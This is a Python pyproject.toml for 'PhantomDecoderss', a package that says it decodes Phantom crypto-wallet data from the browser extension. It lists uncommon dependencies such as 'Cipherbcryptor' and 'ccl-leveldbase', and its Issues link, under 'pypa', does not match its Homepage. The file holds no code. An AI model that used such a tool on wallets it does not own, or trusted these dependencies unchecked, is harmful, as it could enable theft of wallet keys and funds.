[tool.poetry]
name = "PhantomDecoderss"
version = "1.6.8"
description = "Simple Tools for decode Phantom wallet data, from extensions wallet, Phantom."
authors = ["JeanClaude89"]
license = "MIT"
readme = "README.md"
keywords = [
    "extensions", "phantom", "walletdecode", "solana", "evm", "crypto", "decrypt", "wallet"
]

[tool.poetry.dependencies]
python = "^3.7"
PyNaCl = ">=1.5.0"
base58 = ">=2.1.1"
pycryptodome = ">=3.20.0"
Cipherbcryptor = ">=1.2"
bip_utils = ">=2.9.1"
ccl-leveldbase = ">=1.0"


[tool.poetry.dev-dependencies]

[build-system]
requires = ["poetry-core>=1.0.0"]
build-backend = "poetry.core.masonry.api"

[project.urls]
Homepage = "https://github.com/Katana-Crypto"
Issues = "https://github.com/pypa/Katana-Crypto/issues"